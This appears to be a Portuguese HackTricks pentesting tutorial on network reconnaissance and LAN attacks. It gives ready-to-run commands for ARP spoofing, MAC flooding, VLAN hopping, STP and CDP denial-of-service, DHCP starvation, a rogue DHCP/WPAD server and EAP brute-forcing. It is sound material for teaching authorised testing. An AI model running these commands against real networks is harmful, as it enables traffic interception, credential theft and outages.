# Pentesting de Rede

{{#include ../../banners/hacktricks-training.md}}



## Descobrindo hosts a partir de fora

Esta será uma **seção breve** sobre como encontrar **IPs que respondem** pela **Internet**.\
Nessa situação você tem algum **escopo de IPs** (talvez até vários **ranges**) e você só precisa encontrar **quais IPs estão respondendo**.

### ICMP

Esta é a maneira **mais fácil** e **rápida** de descobrir se um host está ativo ou não.\
Você pode tentar enviar alguns pacotes **ICMP** e **esperar respostas**. A maneira mais fácil é enviar um **echo request** e aguardar a resposta. Você pode fazer isso usando um simples `ping` ou usando `fping` para **ranges**.\
Você também pode usar **nmap** para enviar outros tipos de pacotes ICMP (isso evita filtros ao comum echo request ICMP de requisição-resposta).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### Descoberta de portas TCP

É muito comum encontrar que todo tipo de pacotes ICMP está sendo filtrado. Então, tudo o que você pode fazer para verificar se um host está ativo é **tentar encontrar portas abertas**. Cada host tem **65535 portas**, então, se você tiver um escopo "grande" você **não pode** testar se **cada porta** de cada host está aberta ou não, isso levaria muito tempo.\
Então, o que você precisa é de um **scanner de portas rápido** ([masscan](https://github.com/robertdavidgraham/masscan)) e uma lista das **portas mais usadas:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Você também pode executar esta etapa com `nmap`, mas ele é mais lento e o `nmap` tem problemas para identificar hosts ativos.

### Descoberta de Portas HTTP

Isto é apenas uma descoberta de portas TCP útil quando você quer **se concentrar em descobrir serviços HTTP**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

Você também pode tentar verificar se existe algum **UDP port open** para decidir se deve **prestar mais atenção** a um **host.** Como os services UDP normalmente **não respondem** com **qualquer dado** a um UDP probe packet vazio e comum, é difícil dizer se uma port está sendo filtered ou open. A maneira mais fácil de decidir isso é enviar um packet relacionado ao service em execução, e como você não sabe qual service está em execução, você deve tentar o mais provável com base no port number:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
A linha do nmap proposta anteriormente testará os **top 1000 UDP ports** em cada host dentro do **/24** range, mas mesmo isso levará **>20min**. Se precisar de **resultados mais rápidos** você pode usar [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` Isto enviará essas **UDP probes** para suas **expected port** (para um /24 range isso levará apenas 1 min): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Descoberta de Portas SCTP
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Aqui você pode encontrar um bom guia de todos os ataques Wifi bem conhecidos na época em que o texto foi escrito:


{{#ref}}
../pentesting-wifi/
{{#endref}}

## Descobrindo hosts de dentro da network

Se você está dentro da network, uma das primeiras coisas que vai querer fazer é **descobrir outros hosts**. Dependendo de **quanto ruído** você pode/quer gerar, diferentes ações podem ser realizadas:

### Passivo

Você pode usar estas ferramentas para descobrir passivamente hosts dentro de uma network conectada:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Ativo

Observe que as técnicas comentadas em [_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) também podem ser **aplicadas aqui**.\
Mas, como você está na **same network** que os outros hosts, pode fazer **mais coisas**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### ICMP ativo

Note que as técnicas comentadas em _Descobrindo hosts a partir do exterior_ ([_**ICMP**_](#icmp)) também podem ser **aplicadas aqui**.\
Mas, como você está na **mesma rede** que os outros hosts, você pode fazer **mais coisas**:

- Se você **ping** um **endereço de broadcast da sub-rede** o ping deve chegar a **cada host** e eles podem **responder** para **você**: `ping -b 10.10.5.255`
- Ao **ping**ar o **endereço de broadcast da rede** você pode inclusive encontrar hosts dentro de **outras sub-redes**: `ping -b 255.255.255.255`
- Use as flags `-PE`, `-PP`, `-PM` do `nmap` para realizar descoberta de hosts, enviando respectivamente **ICMPv4 echo**, **timestamp**, e **solicitações de máscara de sub-rede:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan é usado para **ligar** computadores através de uma **mensagem de rede**. O magic packet usado para ligar o computador é apenas um pacote onde um **MAC Dst** é fornecido e então ele é **repetido 16 vezes** dentro do mesmo pacote.\
Esses tipos de pacotes costumam ser enviados em um **ethernet 0x0842** ou em um **pacote UDP para a porta 9**.\
Se **nenhum \[MAC]** for fornecido, o pacote é enviado para **ethernet de broadcast** (e o MAC de broadcast será aquele que está sendo repetido).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Escaneamento de Hosts

Depois de descobrir todos os IPs (externos ou internos) que você quer escanear em profundidade, diferentes ações podem ser realizadas.

### TCP

- **Porta aberta**: _SYN --> SYN/ACK --> RST_
- **Porta fechada**: _SYN --> RST/ACK_
- **Porta filtrada**: _SYN --> \[NO RESPONSE]_
- **Porta filtrada**: _SYN --> ICMP message_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Existem 2 opções para escanear uma porta UDP:

- Enviar um **UDP packet** e verificar pela resposta _**ICMP unreachable**_ se a porta está **closed** (em vários casos ICMP será **filtered**, então você não receberá nenhuma informação sobre se a porta está **closed** ou **open**).
- Enviar **formatted datagrams** para provocar uma resposta de um **service** (p.ex., DNS, DHCP, TFTP e outros, como listado em _nmap-payloads_). Se você receber uma **response**, então a porta está **open**.

**Nmap** vai **combinar ambas** as opções usando "-sV" (UDP scans are very slow), mas note que UDP scans são mais lentas que TCP scans:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** foi projetado para ser usado junto com **TCP (Transmission Control Protocol)** e **UDP (User Datagram Protocol)**. Seu principal objetivo é facilitar o transporte de dados de telefonia sobre redes IP, espelhando muitas das funcionalidades de confiabilidade encontradas em **Signaling System 7 (SS7)**. **SCTP** é um componente central da família de protocolos **SIGTRAN**, que tem como objetivo transportar sinais SS7 sobre redes IP.

O suporte para **SCTP** é fornecido por vários sistemas operacionais, como **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, e **VxWorks**, indicando sua ampla aceitação e utilidade no campo de telecomunicações e redes.

Dois scans diferentes para SCTP são oferecidos pelo nmap: _-sY_ e _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS and IPS evasion


{{#ref}}
ids-evasion.md
{{#endref}}

### **Mais opções do nmap**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Revelando Endereços IP Internos

**Misconfigured routers, firewalls, and network devices** às vezes respondem a sondagens de rede usando **endereços de origem não públicos**. **tcpdump** pode ser utilizado para identificar pacotes recebidos de endereços privados durante os testes. Especificamente, no Kali Linux, pacotes podem ser capturados na **eth2 interface**, que é acessível a partir da Internet pública. É importante notar que se seu setup estiver atrás de um NAT ou de um Firewall, esses pacotes provavelmente serão filtrados.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Com Sniffing você pode obter detalhes de IP ranges, subnet sizes, MAC addresses e hostnames ao revisar frames e packets capturados. Se a rede estiver mal configurada ou o switching fabric sob estresse, atacantes podem capturar material sensível via passive network sniffing.

Se uma switched Ethernet network estiver configurada corretamente, você verá apenas broadcast frames e material destinado ao seu MAC address.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Também é possível capturar pacotes de uma máquina remota por meio de uma sessão SSH usando o Wireshark como GUI em tempo real.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Obviamente.

### Capturando credenciais

Você pode usar ferramentas como [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) para extrair credenciais de um pcap ou de uma interface ao vivo.

## Ataques LAN

### ARP spoofing

ARP Spoofing consiste em enviar gratuitous ARPResponses para indicar que o IP de uma máquina tem o MAC do nosso dispositivo. Então, a vítima alterará a tabela ARP e passará a contatar nossa máquina sempre que quiser contatar o IP falsificado.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Encha a CAM table do switch enviando muitos pacotes com endereços MAC de origem diferentes. Quando a CAM table está cheia, o switch começa a comportar-se como um hub (transmitindo todo o tráfego).
```bash
macof -i <interface>
```
Em switches modernos, essa vulnerabilidade foi corrigida.

### 802.1Q VLAN / DTP Ataques

#### Trunking Dinâmico

O **Dynamic Trunking Protocol (DTP)** foi projetado como um protocolo da camada de enlace para facilitar um sistema automático de trunking, permitindo que switches selecionem automaticamente portas para modo trunk (Trunk) ou modo não-trunk. A implementação de **DTP** costuma ser vista como indicativa de um desenho de rede subótimo, ressaltando a importância de configurar trunks manualmente apenas onde necessário e garantir documentação adequada.

Por padrão, as portas dos switches estão configuradas para operar em Dynamic Auto mode, o que significa que estão prontas para iniciar trunking se forem solicitadas por um switch vizinho. Surge uma preocupação de segurança quando um pentester ou atacante conecta-se ao switch e envia um DTP Desirable frame, forçando a porta a entrar em modo trunk. Essa ação permite ao atacante enumerar VLANs por meio da análise de frames STP e contornar a segmentação de VLAN configurando interfaces virtuais.

A presença de **DTP** em muitos switches por padrão pode ser explorada por adversários para imitar o comportamento de um switch, ganhando acesso ao tráfego em todas as VLANs. O script [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) é usado para monitorar uma interface, revelando se um switch está em Default, Trunk, Dynamic, Auto ou Access mode — este último sendo a única configuração imune a VLAN hopping attacks. Essa ferramenta avalia o estado de vulnerabilidade do switch.

Caso seja identificada vulnerabilidade na rede, a ferramenta _**Yersinia**_ pode ser usada para "enable trunking" via o protocolo DTP, permitindo a observação dos pacotes de todas as VLANs.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Para enumerar as VLANs, também é possível gerar o frame DTP Desirable com o script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. D**Não interrompa o script sob nenhuma circunstância. Ele injeta DTP Desirable a cada três segundos. **Os trunk channels criados dinamicamente no switch só duram cinco minutos. Após cinco minutos, o trunk cai.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Gostaria de salientar que **Access/Desirable (0x03)** indica que o frame DTP é do tipo Desirable, o que instrui a porta a mudar para Trunk mode. E **802.1Q/802.1Q (0xa5** indica o tipo de encapsulamento **802.1Q**.

Ao analisar os frames STP, **descobrimos a existência da VLAN 30 e da VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Atacando VLANs específicas

Uma vez que você conhece os IDs de VLAN e os valores de IP, você pode **configurar uma interface virtual para atacar uma VLAN específica**.\
Se DHCP não estiver disponível, use _ifconfig_ para definir um endereço IP estático.

<details>
<summary>Configuração de interface VLAN (exemplo)</summary>
```bash
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```
</details>
```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

Os ataques discutidos de **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** em outras VLANs são **automaticamente realizados** pela ferramenta: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Se um atacante conhece o valor do **MAC, IP and VLAN ID of the victim host**, ele poderia tentar **double tag a frame** com a sua VLAN designada e a VLAN da vítima e enviar um pacote. Como a vítima não conseguirá conectar de volta com o atacante, a **melhor opção para o atacante é comunicar via UDP** para protocolos que podem executar ações interessantes (como SNMP).

Outra opção para o atacante é lançar um **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** (provavelmente através da internet). Depois, o atacante poderia sniff no segundo host pertencente a ele, caso este receba alguns pacotes da vítima.

![](<../../images/image (190).png>)

Para realizar este ataque você pode usar scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

Se você tem **acesso a um switch ao qual está diretamente conectado**, você tem a capacidade de **bypass VLAN segmentation** dentro da rede. Simplesmente **mude a porta para trunk mode** (otherwise known as trunk), crie interfaces virtuais com os IDs das VLANs alvo e configure um endereço IP. Você pode tentar solicitar o endereço dinamicamente (DHCP) ou configurá-lo estaticamente. Depende do caso.


{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

Em certos ambientes, como redes Wi‑Fi de convidados, as configurações de **port isolation (also known as private VLAN)** são implementadas para impedir que clientes conectados a um wireless access point se comuniquem diretamente entre si. No entanto, foi identificada uma técnica que pode contornar essas medidas de isolamento. Essa técnica explora tanto a ausência de ACLs de rede quanto sua configuração inadequada, permitindo que pacotes IP sejam roteados através de um router para alcançar outro cliente na mesma rede.

O ataque é executado criando um **pacote que carrega o endereço IP do cliente de destino, mas com o MAC do router**. Isso faz com que o router encaminhe erroneamente o pacote para o cliente alvo. Essa abordagem é semelhante à usada em Double Tagging Attacks, onde a capacidade de controlar um host acessível à vítima é usada para explorar a falha de segurança.

**Key Steps of the Attack:**

1. **Crafting a Packet:** Um pacote é especialmente elaborado para incluir o endereço IP do cliente alvo, mas com o MAC do router.
2. **Exploiting Router Behavior:** O pacote elaborado é enviado ao router que, devido à configuração, redireciona o pacote para o cliente alvo, contornando o isolamento fornecido pelas configurações de private VLAN.

### VTP Attacks

VTP (VLAN Trunking Protocol) centraliza o gerenciamento de VLANs. Ele utiliza números de revisão para manter a integridade da VLAN database; qualquer modificação incrementa esse número. Switches adotam configurações com números de revisão mais altos, atualizando suas próprias VLAN databases.

#### VTP Domain Roles

- **VTP Server:** Gerencia VLANs—cria, deleta, modifica. Ele transmite VTP announcements para os membros do domínio.
- **VTP Client:** Recebe VTP announcements para sincronizar sua VLAN database. Esse papel é restrito de modificar configurações locais de VLAN.
- **VTP Transparent:** Não participa de VTP updates, mas encaminha VTP announcements. Não é afetado por VTP attacks, mantendo um número de revisão constante igual a zero.

#### VTP Advertisement Types

- **Summary Advertisement:** Transmitido pelo VTP server a cada 300 segundos, carregando informações essenciais do domínio.
- **Subset Advertisement:** Enviado após alterações na configuração de VLAN.
- **Advertisement Request:** Emitido por um VTP client para solicitar um Summary Advertisement, tipicamente em resposta à detecção de um número de revisão de configuração mais alto.

As vulnerabilidades do VTP são exploráveis exclusivamente via trunk ports, já que os VTP announcements circulam somente por eles. Cenários pós-ataque DTP podem evoluir para VTP. Ferramentas como Yersinia podem facilitar VTP attacks, com o objetivo de apagar a VLAN database, interrompendo efetivamente a rede.

Note: This discussion pertains to VTP version 1 (VTPv1).
```bash
yersinia -G # Launch Yersinia in graphical mode
```
No modo gráfico do Yersinia, escolha a opção deleting all VTP vlans para purgar o banco de dados VLAN.

### Ataques STP

**Se não conseguir capturar frames BPDU nas suas interfaces, é improvável que tenha sucesso em um ataque STP.**

#### **STP BPDU DoS**

O envio massivo de BPDUs TCP (Topology Change Notification) ou Conf (os BPDUs enviados quando a topologia é criada) sobrecarrega os switches, que deixam de funcionar corretamente.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

Quando um TCP é enviado, a CAM table dos switches será apagada em 15s. Então, se você estiver enviando continuamente esse tipo de packets, a CAM table será reiniciada continuamente (ou a cada 15segs) e, quando for reiniciada, o switch passa a se comportar como um hub
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

O atacante simula o comportamento de um switch para se tornar o STP root da rede. Assim, mais tráfego passará por ele. Isso é interessante quando você está conectado a dois switches diferentes.\
Isso é feito enviando pacotes BPDUs CONF dizendo que o valor **priority** é menor do que a prioridade do switch root atual.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Se o atacante estiver conectado a 2 switches, ele pode ser a root da nova árvore e todo o tráfego entre esses switches passará por ele** (a MITM attack will be performed).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Ataques CDP

CISCO Discovery Protocol (CDP) é essencial para a comunicação entre dispositivos CISCO, permitindo que eles **se identifiquem e compartilhem detalhes de configuração**.

#### Coleta Passiva de Dados <a href="#id-0e0f" id="id-0e0f"></a>

CDP é configurado para transmitir informações por todas as portas, o que pode representar um risco de segurança. Um atacante, ao conectar-se a uma porta do switch, pode executar sniffers de rede como **Wireshark**, **tcpdump**, ou **Yersinia**. Essa ação pode revelar dados sensíveis sobre o dispositivo de rede, incluindo seu modelo e a versão do Cisco IOS que executa. O atacante pode então mirar vulnerabilidades específicas na versão do Cisco IOS identificada.

#### Indução de Flood na Tabela CDP <a href="#id-0d6a" id="id-0d6a"></a>

Uma abordagem mais agressiva envolve lançar um ataque Denial of Service (DoS) ao sobrecarregar a memória do switch, fingindo ser dispositivos CISCO legítimos. Abaixo está a sequência de comandos para iniciar esse ataque usando Yersinia, uma ferramenta de rede projetada para testes:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Durante este ataque, a CPU do switch e a CDP neighbor table ficam fortemente sobrecarregadas, levando ao que muitas vezes é chamado de **“paralisação da rede”** devido ao consumo excessivo de recursos.

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Você também pode usar [**scapy**](https://github.com/secdev/scapy/). Certifique-se de instalá-lo com o pacote `scapy/contrib`.

### Ataques VoIP e a ferramenta VoIP Hopper

Telefones VoIP, cada vez mais integrados com dispositivos IoT, oferecem funcionalidades como destrancar portas ou controlar termostatos através de números de telefone especiais. Contudo, essa integração pode representar riscos de segurança.

A ferramenta [**voiphopper**](http://voiphopper.sourceforge.net) foi projetada para emular um telefone VoIP em vários ambientes (Cisco, Avaya, Nortel, Alcatel-Lucent). Ela descobre o VLAN ID da rede de voz usando protocolos como CDP, DHCP, LLDP-MED e 802.1Q ARP.

**VoIP Hopper** oferece três modos para o Cisco Discovery Protocol (CDP):

1. **Sniff Mode** (`-c 0`): Analisa pacotes de rede para identificar o VLAN ID.
2. **Spoof Mode** (`-c 1`): Gera pacotes personalizados que imitam os de um dispositivo VoIP real.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): Envia pacotes idênticos aos de um modelo específico de Cisco IP phone.

O modo preferido por velocidade é o terceiro. Ele requer a especificação de:

- A interface de rede do atacante (`-i` parameter).
- O nome do dispositivo VoIP sendo emulado (`-E` parameter), seguindo o formato de nome da Cisco (por exemplo, SEP seguido por um endereço MAC).

Em ambientes corporativos, para imitar um dispositivo VoIP existente, pode-se:

- Inspecionar a etiqueta MAC no telefone.
- Navegar nas configurações de display do telefone para ver informações do modelo.
- Conectar o dispositivo VoIP a um laptop e observar requisições CDP com Wireshark.

Um comando de exemplo para executar a ferramenta no terceiro modo seria:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP Attacks

#### Enumeration
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Dois tipos de DoS** podem ser realizados contra servidores DHCP. O primeiro consiste em **simular hosts falsos suficientes para consumir todos os possíveis endereços IP**.\
Esse ataque só funcionará se você conseguir ver as respostas do servidor DHCP e completar o protocolo (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Por exemplo, isso **não é possível em redes Wifi**.

Outra forma de realizar um DoS em DHCP é enviar um **pacote DHCP-RELEASE usando como endereço de origem cada possível IP**. Então, o servidor vai pensar que todo mundo terminou de usar o IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Uma forma mais automática de fazer isso é usar a ferramenta [DHCPing](https://github.com/kamorin/DHCPig)

You could use the mentioned DoS attacks to force clients to obtain new leases within the environment, and exhaust legitimate servers so that they become unresponsive. So when the legitimate try to reconnect, **você pode fornecer valores maliciosos mencionados no próximo ataque**.

#### Definir valores maliciosos

Um servidor DHCP malicioso pode ser configurado usando o script DHCP localizado em `/usr/share/responder/DHCP.py`. Isso é útil para ataques de rede, como capturar tráfego HTTP e credenciais, redirecionando o tráfego para um servidor malicioso. No entanto, configurar um gateway malicioso é menos eficaz, já que só permite capturar o tráfego de saída do cliente, perdendo as respostas do gateway legítimo. Em vez disso, recomenda-se configurar um servidor DNS ou WPAD malicioso para um ataque mais eficaz.

Abaixo estão as opções de comando para configurar o servidor DHCP malicioso:

- **Our IP Address (Gateway Advertisement)**: Use `-i 10.0.0.100` para anunciar o IP da sua máquina como o gateway.
- **Local DNS Domain Name**: Opcionalmente, use `-d example.org` para definir um nome de domínio DNS local.
- **Original Router/Gateway IP**: Use `-r 10.0.0.1` para especificar o endereço IP do roteador ou gateway legítimo.
- **Primary DNS Server IP**: Use `-p 10.0.0.100` para definir o IP do servidor DNS malicioso que você controla.
- **Secondary DNS Server IP**: Opcionalmente, use `-s 10.0.0.1` para definir o IP de um servidor DNS secundário.
- **Netmask of Local Network**: Use `-n 255.255.255.0` para definir a máscara da rede local.
- **Interface for DHCP Traffic**: Use `-I eth1` para escutar o tráfego DHCP em uma interface de rede específica.
- **WPAD Configuration Address**: Use `-w “http://10.0.0.100/wpad.dat”` para definir o endereço de configuração WPAD, ajudando na interceptação de tráfego web.
- **Spoof Default Gateway IP**: Inclua `-S` para falsificar o endereço IP do gateway padrão.
- **Respond to All DHCP Requests**: Inclua `-R` para fazer o servidor responder a todas as solicitações DHCP, mas esteja ciente de que isso é ruidoso e pode ser detectado.

Ao usar corretamente essas opções, um servidor DHCP malicioso pode ser estabelecido para interceptar o tráfego de rede de forma eficaz.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **Ataques EAP**

Aqui estão algumas das táticas de ataque que podem ser usadas contra implementações 802.1X:

- Brute-force ativo de senhas via EAP
- Atacando o servidor RADIUS com conteúdo EAP malformado _\*\*_(exploits)
- Captura de mensagens EAP e quebra de senhas offline (EAP-MD5 e PEAP)
- Forçar a autenticação EAP-MD5 para contornar a validação de certificados TLS
- Injetar tráfego de rede malicioso ao autenticar usando um hub ou similar

Se o atacante estiver entre a vítima e o servidor de autenticação, ele pode tentar degradar (se necessário) o protocolo de autenticação para EAP-MD5 e capturar a tentativa de autenticação. Em seguida, ele poderia realizar brute-force nisso usando:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Ataques <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) é uma classe de protocolos de rede projetada para **criar um sistema de roteamento redundante ativo**. Com FHRP, roteadores físicos podem ser combinados em um único dispositivo lógico, o que aumenta a tolerância a falhas e ajuda a distribuir a carga.

**Engenheiros da Cisco Systems desenvolveram dois protocolos FHRP, GLBP e HSRP.**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Três versões do Routing Information Protocol (RIP) são conhecidas: RIP, RIPv2 e RIPng. Datagrams são enviados para peers via porta 520 usando UDP pelo RIP e RIPv2, enquanto datagrams são broadcastados para a porta UDP 521 via multicast IPv6 pelo RIPng. Suporte para autenticação MD5 foi introduzido pelo RIPv2. Por outro lado, autenticação nativa não é incorporada pelo RIPng; em vez disso, depende-se dos cabeçalhos IPsec AH e ESP dentro do IPv6.

- **RIP e RIPv2:** Comunicação é feita através de datagrams UDP na porta 520.
- **RIPng:** Utiliza a porta UDP 521 para broadcast de datagrams via multicast IPv6.

